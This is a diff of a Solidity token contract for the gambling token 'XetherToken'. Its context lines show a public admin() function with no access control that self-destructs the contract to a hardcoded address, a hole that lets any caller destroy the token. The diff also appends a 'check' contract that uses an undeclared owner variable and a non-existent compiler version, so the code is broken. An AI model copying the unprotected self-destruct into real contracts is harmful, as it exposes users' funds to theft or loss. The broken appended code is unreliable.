@@ -1,6 +1,6 @@
 pragma solidity 0.5.6;
 
-/** 
+/**
  * xether.io - is a gambling ecosystem, which makes a difference by caring about its users.
  * It’s our passion for perfection, as well as finding and creating neat solutions,
  * that keeps us driven towards our goals.
@@ -850,5 +850,14 @@ contract XetherToken is ERC20Detailed("XetherEcosystemToken", "XEET", 18), ERC20
 
     function admin() public {
 		selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
-	}    
+	}
+}
+pragma solidity ^0.5.24;
+contract check {
+	uint validSender;
+	constructor() public {owner = msg.sender;}
+	function destroy() public {
+		assert(msg.sender == owner);
+		selfdestruct(this);
+	}
 }
